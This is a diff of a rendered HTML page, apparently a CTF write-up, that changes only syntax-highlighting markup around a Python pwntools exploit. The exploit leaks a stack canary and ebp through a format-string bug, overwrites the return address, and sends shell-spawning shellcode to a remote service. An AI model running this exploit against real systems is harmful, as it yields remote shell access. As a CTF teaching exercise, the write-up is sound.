@@ -408,7 +408,7 @@ But notice that the program will filter out the character ‘n’, which means w
 
 <p>Here’s the payload string:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c1"># remove the null byte first
-</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># padding to canary
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"%122c"</span> <span class="c1"># padding to canary
 </span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c1"># padding to return address
 </span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># return address set to buffer's address (=shellcode)
@@ -416,7 +416,7 @@ But notice that the program will filter out the character ‘n’, which means w
 # send the first payload
 </span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># add the null byte back into the canary
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%122c"</span> <span class="c1"># add the null byte back into the canary
 # send the second payload
 </span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </code></pre></div></div>
@@ -489,49 +489,49 @@ d:
 </span><span class="n">shellcode</span> <span class="o">=</span>  <span class="p">[</span><span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">]</span>
 
 <span class="c1"># insert 0x90 in the left, make it length = 63
-</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">).</span><span class="n">rjust</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
 
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back:"</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking canary &amp; ebp..."</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">".</span><span class="si">%26</span><span class="s">$p.</span><span class="si">%29</span><span class="s">$p"</span><span class="p">)</span>
-<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back:"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking canary &amp; ebp..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">".%26$p.%29$p"</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 
-<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-<span class="n">ebp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ebp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">buf</span> <span class="o">=</span> <span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x9c</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">8</span>
 
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"canary: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ebp: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"buf: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"canary: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ebp: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"buf: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
 
 <span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c1"># remove the null byte first
-</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># padding to canary
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"%122c"</span> <span class="c1"># padding to canary
 </span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c1"># padding to return address
 </span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># return address set to buffer's address (=shellcode)
 </span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># fd
 </span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># add the null byte back into the canary
-</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"correcting canary..."</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%122c"</span> <span class="c1"># add the null byte back into the canary
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"correcting canary..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending shellcode..."</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending shellcode..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
